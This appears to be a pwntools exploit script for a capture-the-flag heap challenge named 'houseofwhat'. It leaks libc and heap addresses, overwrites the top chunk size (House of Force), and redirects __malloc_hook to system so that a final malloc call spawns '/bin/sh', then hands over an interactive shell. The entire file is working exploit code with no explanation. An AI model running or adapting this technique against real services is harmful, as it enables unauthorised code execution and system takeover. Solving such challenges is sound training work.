#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('houseofwhat')
libc = exe.libc

host = args.HOST or '172.17.0.2'
port = int(args.PORT or 3141)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

# EXPLOIT IS NOT 100% RELIABLE, TRY A FEW TIMES

def malloc(size, data, final=False):
    io.sendline(b"2")
    io.sendafter(b"Size: ", bytes(str(size), 'utf-8'))
    if final: return
    io.sendafter(b"Message: ", data)
    io.recvuntil(b"> ")

io = start()
io.recvuntil(b"you: ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
log.info(f"libc base @ {hex(libc.address)}")

io.recvuntil(b"another: ")
heap = int(io.recvline(), 16)
log.info(f"heap @ {hex(heap)}")

malloc(24, b"A"*24 + p64(0xffffffffffffffff))
distance = libc.sym.__malloc_hook - (heap+0x20)
malloc(distance, b"/bin/sh\0")
malloc(24, p64(libc.sym.system))

cmd = heap + 0x10
malloc(cmd, b"", True)

io.interactive()
